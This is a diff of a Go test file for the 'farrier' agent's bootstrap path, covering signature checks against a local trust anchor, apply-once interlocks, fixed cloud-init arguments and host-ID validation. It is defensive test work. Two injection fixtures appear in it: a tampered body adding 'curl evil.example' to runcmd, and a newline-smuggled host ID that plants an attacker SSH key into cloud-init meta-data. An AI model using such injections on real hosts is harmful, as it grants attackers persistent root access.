@@ -2,13 +2,19 @@ package agent
 
 import (
 	"context"
+	"crypto/ed25519"
+	"crypto/rand"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
+	"io"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 
+	"github.com/pascalgross/farrier/internal/canonical"
 	"github.com/pascalgross/farrier/internal/protocol"
 	"github.com/pascalgross/farrier/internal/signing"
 )
@@ -22,18 +28,78 @@ var testBootstrap = protocol.Bootstrap{
 
 // testKey is the trusted-signers entry the fixture pretends verified the template.
 //
-// applyBootstrap takes the key verifyBootstrap returned; these tests hand it one directly, because
-// verification's own behaviour — the anchor at a fixed root-owned path — is asserted where it runs and
-// cannot be exercised from a unit test's privileges.
+// applyBootstrap takes the key verifyBootstrap returned; the tests that only exercise application hand
+// it one directly. The tests that exercise verification build a real key and a real anchor below.
 var testKey = signing.PublicKey{Algorithm: signing.Ed25519, KeyID: "ops-laptop", Backend: "file"}
 
-// TestApplyBootstrapRecordsBeforeItRuns is guardrail 2 of docs/SECURITY.md §7 as an ordering assertion.
+// signTemplate signs a template the way `farrier sign-template` does and returns the matching anchor.
+//
+// Offline, over the shared canonical payload, with a key this test generated and nothing of any
+// server's involved — which is the whole point of the thing being asserted. The returned SignerSet is
+// built through the same parser the agent uses on /etc/farrier/trusted-signers, so a test that passes
+// here is a test about the file an administrator actually writes.
+func signTemplate(t *testing.T, b protocol.Bootstrap, keyID string) (protocol.Bootstrap, *signing.SignerSet) {
+	t.Helper()
+	public, private, err := ed25519.GenerateKey(rand.Reader)
+	if err != nil {
+		t.Fatalf("generating a signing key: %v", err)
+	}
+	payload, err := canonical.Marshal(b.SignedPayload())
+	if err != nil {
+		t.Fatalf("canonicalising: %v", err)
+	}
+	b.Signature = base64.StdEncoding.EncodeToString(ed25519.Sign(private, payload))
+	b.SignerKeyID = keyID
+
+	alg, encoded, err := signing.EncodePublicKey(public)
+	if err != nil {
+		t.Fatalf("encoding the public key: %v", err)
+	}
+	set, err := signing.ParseSigners(strings.NewReader(string(alg)+" "+encoded+" "+keyID+" file\n"), "test")
+	if err != nil {
+		t.Fatalf("parsing the anchor: %v", err)
+	}
+	return b, set
+}
+
+// captureStdout runs fn with standard output redirected, and returns what it wrote.
+//
+// verifyBootstrap prints the template to the terminal because guardrail 2 of docs/SECURITY.md §7 says
+// the operator authorising it must see it, and a property nothing observes is a property that quietly
+// stops holding. Capturing the real stream is what makes the assertion about the thing the operator
+// sees rather than about a seam introduced for the test.
+func captureStdout(t *testing.T, fn func()) string {
+	t.Helper()
+	original := os.Stdout
+	r, w, err := os.Pipe()
+	if err != nil {
+		t.Fatalf("creating a pipe: %v", err)
+	}
+	os.Stdout = w
+
+	done := make(chan string, 1)
+	go func() {
+		out, _ := io.ReadAll(r)
+		done <- string(out)
+	}()
+
+	fn()
+
+	os.Stdout = original
+	if err := w.Close(); err != nil {
+		t.Fatalf("closing the pipe: %v", err)
+	}
+	return <-done
+}
+
+// TestGuaranteeBootstrapIsRecordedBeforeItRuns is guardrail 2 of docs/SECURITY.md §7 as an ordering
+// assertion.
 //
 // The record must exist, durably and in full, at the moment the executor starts: it is the only thing
 // that survives a template that crashes the machine halfway, and "what was attempted" is the question
 // an incident asks. The fake executor does the asserting, because it runs at exactly the instant the
 // ordering is about.
-func TestApplyBootstrapRecordsBeforeItRuns(t *testing.T) {
+func TestGuaranteeBootstrapIsRecordedBeforeItRuns(t *testing.T) {
 	stateDir, seedDir := t.TempDir(), t.TempDir()
 	recordPath := filepath.Join(stateDir, BootstrapRecordFile)
 
@@ -74,9 +140,9 @@ func TestApplyBootstrapRecordsBeforeItRuns(t *testing.T) {
 	}
 }
 
-// TestApplyBootstrapSeedsCloudInit proves the body becomes a file where cloud-init reads it, and never
-// an argument.
-func TestApplyBootstrapSeedsCloudInit(t *testing.T) {
+// TestGuaranteeBootstrapReachesCloudInitAsAFileNotAnArgument proves the body becomes a file where
+// cloud-init reads it, and never an argument.
+func TestGuaranteeBootstrapReachesCloudInitAsAFileNotAnArgument(t *testing.T) {
 	stateDir, seedDir := t.TempDir(), t.TempDir()
 
 	ran := false
@@ -102,15 +168,56 @@ func TestApplyBootstrapSeedsCloudInit(t *testing.T) {
 	if !ran {
 		t.Fatal("the executor never ran")
 	}
+
+	// And it does not stay behind. A NoCloud seed left in place outranks the machine's real datasource
+	// on every later boot, which would make "applied exactly once" true of Farrier's action and false
+	// of the machine it left behind.
+	for _, name := range []string{"user-data", "meta-data"} {
+		if _, err := os.Stat(filepath.Join(seedDir, name)); !errors.Is(err, os.ErrNotExist) {
+			t.Errorf("the seed %s survived the application: %v", name, err)
+		}
+	}
 }
 
-// TestApplyBootstrapIsOnceOnly proves the interlock: a written record refuses the next attempt, at the
-// same check every build honours.
+// TestGuaranteeCloudInitArgumentsAreFixed proves nothing from a template can reach a command line.
+//
+// Guardrail 5 of docs/SECURITY.md §7 is that cloud-init does the applying, and the property that makes
+// it more than a slogan is that the argument vectors are ours: four stage invocations, each a stage
+// name and at most one mode flag. Anything derived from a body, a parameter or a control-plane response
+// appearing here would be the exec channel wearing a hat, whatever the catalogue said.
+func TestGuaranteeCloudInitArgumentsAreFixed(t *testing.T) {
+	expected := [][]string{
+		{"init", "--local"},
+		{"init"},
+		{"modules", "--mode=config"},
+		{"modules", "--mode=final"},
+	}
+	if len(cloudInitStages) != len(expected) {
+		t.Fatalf("cloud-init is run with %d stages, expected %d: %v",
+			len(cloudInitStages), len(expected), cloudInitStages)
+	}
+	permitted := map[string]bool{
+		"init": true, "modules": true, "--local": true, "--mode=config": true, "--mode=final": true,
+	}
+	for i, stage := range cloudInitStages {
+		if strings.Join(stage, " ") != strings.Join(expected[i], " ") {
+			t.Errorf("stage %d is %v, expected %v", i, stage, expected[i])
+		}
+		for _, arg := range stage {
+			if !permitted[arg] {
+				t.Errorf("stage %d passes %q, which is not one of cloud-init's own stage words. "+
+					"No byte of a template, a parameter or a response may become an argument.", i, arg)
+			}
+		}
+	}
+}
+
+// TestGuaranteeBootstrapAppliesAtMostOnce proves the interlock: a written record refuses the next
+// attempt, at the same check every build honours.
 //
 // The second attempt goes through verifyBootstrap, which is where re-enrolment lands, and the interlock
-// is its first check — before the trust anchor is even read, which is what makes this assertable from a
-// unit test that cannot write /etc/farrier.
-func TestApplyBootstrapIsOnceOnly(t *testing.T) {
+// is its first check — before the trust anchor is even read.
+func TestGuaranteeBootstrapAppliesAtMostOnce(t *testing.T) {
 	stateDir, seedDir := t.TempDir(), t.TempDir()
 	opts := EnrollOptions{
 		StateDir:      stateDir,
@@ -121,22 +228,29 @@ func TestApplyBootstrapIsOnceOnly(t *testing.T) {
 		t.Fatalf("applying: %v", err)
 	}
 
-	_, err := verifyBootstrap(stateDir, testBootstrap)
+	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")
+	_, err := verifyBootstrap(stateDir, anchor, signed)
 	if err == nil {
 		t.Fatal("a second application was permitted")
 	}
 	if !strings.Contains(err.Error(), "standard-server") || !strings.Contains(err.Error(), "applied") {
 		t.Fatalf("the refusal does not name what was applied: %v", err)
 	}
+
+	// And it is answerable without the template, which is what lets enrolment ask before it spends a
+	// single-use token rather than after.
+	if err := checkBootstrapInterlock(stateDir); err == nil {
+		t.Fatal("the interlock reads as open with a record on disk")
+	}
 }
 
-// TestApplyBootstrapFailureLeavesTheRecordStanding proves a failed application still consumed the
+// TestGuaranteeAFailedBootstrapStillConsumesTheInterlock proves a failed application still consumed the
 // interlock and still tells the truth.
 //
 // This is the deliberate direction of the trade: a crash between deciding and applying costs a manual
 // re-run at worst, and never permits a second automatic attempt — because "the template ran twice" is
 // the lie the record exists to make impossible.
-func TestApplyBootstrapFailureLeavesTheRecordStanding(t *testing.T) {
+func TestGuaranteeAFailedBootstrapStillConsumesTheInterlock(t *testing.T) {
 	stateDir, seedDir := t.TempDir(), t.TempDir()
 	opts := EnrollOptions{
 		StateDir:      stateDir,
@@ -155,12 +269,14 @@ func TestApplyBootstrapFailureLeavesTheRecordStanding(t *testing.T) {
 	if _, statErr := os.Stat(recordPath); statErr != nil {
 		t.Fatalf("the record did not survive the failure: %v", statErr)
 	}
-	if _, verifyErr := verifyBootstrap(stateDir, testBootstrap); verifyErr == nil {
+	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")
+	if _, verifyErr := verifyBootstrap(stateDir, anchor, signed); verifyErr == nil {
 		t.Fatal("a failed application left the interlock open")
 	}
 }
 
-// TestAnUnreadableRecordRefusesRatherThanReapplying keeps the apply-once interlock from failing open.
+// TestGuaranteeAnUnreadableRecordRefusesRatherThanReapplying keeps the apply-once interlock from
+// failing open.
 //
 // The interlock is a file that is *there*, so the only reading of "I could not read it" that is safe
 // is "I do not know". Treating it as "no template has been applied" re-applies one — on a host that
@@ -170,17 +286,131 @@ func TestApplyBootstrapFailureLeavesTheRecordStanding(t *testing.T) {
 // A directory where the record should be is the fixture, because it produces a read error on every
 // platform and under every user, including the root that runs the real agent — a mode-000 file does
 // not.
-func TestAnUnreadableRecordRefusesRatherThanReapplying(t *testing.T) {
+func TestGuaranteeAnUnreadableRecordRefusesRatherThanReapplying(t *testing.T) {
 	stateDir := t.TempDir()
 	if err := os.Mkdir(filepath.Join(stateDir, BootstrapRecordFile), 0o755); err != nil {
 		t.Fatalf("creating the unreadable record: %v", err)
 	}
 
-	_, err := verifyBootstrap(stateDir, testBootstrap)
+	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")
+	_, err := verifyBootstrap(stateDir, anchor, signed)
 	if err == nil {
 		t.Fatal("an unreadable bootstrap record was treated as no record at all")
 	}
 	if !strings.Contains(err.Error(), "unknown") {
 		t.Fatalf("the refusal does not say the question is unanswered: %v", err)
+	}
+}
+
+// TestGuaranteeABootstrapIsVerifiedAgainstTheHostsOwnAnchor is guardrail 3 of docs/SECURITY.md §7.
+//
+// A template is applied only when a key already in this host's own trusted-signers produced the
+// signature. The refusal case is the one that matters: a template signed by a key this host does not
+// list is a control plane authorising itself, which is exactly what the guarantee's first paragraph
+// says cannot happen.
+func TestGuaranteeABootstrapIsVerifiedAgainstTheHostsOwnAnchor(t *testing.T) {
+	signed, anchor := signTemplate(t, testBootstrap, "ops-laptop")
+
+	key, err := verifyBootstrap(t.TempDir(), anchor, signed)
+	if err != nil {
+		t.Fatalf("a template signed by a listed key was refused: %v", err)
+	}
+	if key.KeyID != "ops-laptop" {
+		t.Errorf("verification returned key %q", key.KeyID)
+	}
+
+	// A different key, listed nowhere on this host. The template is genuinely signed; it is simply
+	// signed by somebody this machine has never agreed to obey.
+	stranger, _ := signTemplate(t, testBootstrap, "someone-else")
+	if _, err := verifyBootstrap(t.TempDir(), anchor, stranger); err == nil {
+		t.Fatal("a template signed by an untrusted key was applied")
+	}
+
+	// And a body altered after signing fails against the same anchor, because the signature covers the
+	// payload rather than a digest anybody handed over.
+	tampered := signed
+	tampered.Body += "runcmd:\n  - curl evil.example\n"
+	if _, err := verifyBootstrap(t.TempDir(), anchor, tampered); err == nil {
+		t.Fatal("a template altered after signing was applied")
+	}
+}
+
+// TestGuaranteeBootstrapNeverFallsBackToTrustingTheServer covers the chicken-and-egg answer in
+// docs/SECURITY.md §7.
+//
+// The anchor is established from a local file the administrator chose, before anything is fetched, and
+// with none present `--bootstrap` refuses outright. There is no flag that relaxes it and no fallback,
+// because a template verified against a key the server supplied is a template verified against
+// nothing.
+func TestGuaranteeBootstrapNeverFallsBackToTrustingTheServer(t *testing.T) {
+	signed, _ := signTemplate(t, testBootstrap, "ops-laptop")
+
+	empty, err := signing.ParseSigners(strings.NewReader("# no keys here\n"), "test")
+	if err != nil {
+		t.Fatalf("parsing an empty anchor: %v", err)
+	}
+	for name, anchor := range map[string]*signing.SignerSet{"empty": empty, "absent": nil} {
+		_, err := verifyBootstrap(t.TempDir(), anchor, signed)
+		if err == nil {
+			t.Fatalf("%s anchor: a template was applied with no trust anchor", name)
+		}
+		if !errors.Is(err, ErrNoTrustAnchor) {
+			t.Fatalf("%s anchor: the refusal is not the no-anchor one: %v", name, err)
+		}
+	}
+}
+
+// TestGuaranteeTheOperatorSeesTheWholeTemplate is guardrail 2's other half.
+//
+// The person running the enrolment is authorising something that will run as root on their machine, so
+// they are shown the whole body — escaped, because a raw one can carry terminal control sequences that
+// scroll the real content away or forge the end marker, and an operator who approved what they were
+// shown must have been shown what runs.
+func TestGuaranteeTheOperatorSeesTheWholeTemplate(t *testing.T) {
+	body := "#cloud-config\nruncmd:\n  - echo hello\n"
+	signed, anchor := signTemplate(t, protocol.Bootstrap{Name: "standard-server", Body: body}, "ops-laptop")
+
+	stateDir := t.TempDir()
+	printed := captureStdout(t, func() {
+		if _, err := verifyBootstrap(stateDir, anchor, signed); err != nil {
+			t.Errorf("verifying: %v", err)
+		}
+	})
+
+	if !strings.Contains(printed, "standard-server") || !strings.Contains(printed, "ops-laptop") {
+		t.Errorf("the display names neither the template nor its signer: %q", printed)
+	}
+	// Quoted, which is also how the whole body survives on one line: the escaped form of the body has
+	// to appear, not a summary of it and not the raw text.
+	if !strings.Contains(printed, strings.Trim(strconv.Quote(body), `"`)) {
+		t.Errorf("the body was not printed in full and escaped: %q", printed)
+	}
+}
+
+// TestGuaranteeTheSeedCannotBeInjectedThroughTheHostID closes the one channel beside the template.
+//
+// The seed's meta-data is a YAML document cloud-init parses and acts on, and the host id is
+// interpolated into it. A control plane that returned an id carrying a newline could add keys to that
+// document — `public-keys`, which cloud-init installs into authorized_keys — beside a template the
+// operator did approve: not covered by the offline signature, not shown, not recorded. The agent does
+// not get to assume the control plane is well behaved, so the id is checked where it is used.
+func TestGuaranteeTheSeedCannotBeInjectedThroughTheHostID(t *testing.T) {
+	injected := "01JHOST\npublic-keys:\n  - ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATTACKER attacker@evil"
+
+	seedDir := t.TempDir()
+	if err := writeSeed(seedDir, injected, "#cloud-config\n"); err == nil {
+		t.Fatal("a host id carrying a newline was written into cloud-init's meta-data")
+	}
+	if _, err := os.Stat(filepath.Join(seedDir, "meta-data")); !errors.Is(err, os.ErrNotExist) {
+		t.Errorf("a meta-data file was written anyway: %v", err)
+	}
+
+	if !protocol.ValidHostID("01JHOST") {
+		t.Error("an ordinary generated host id was refused")
+	}
+	for _, bad := range []string{injected, "01J HOST", "01J/HOST", "", strings.Repeat("A", 65)} {
+		if protocol.ValidHostID(bad) {
+			t.Errorf("%q was accepted as a host id", bad)
+		}
 	}
 }
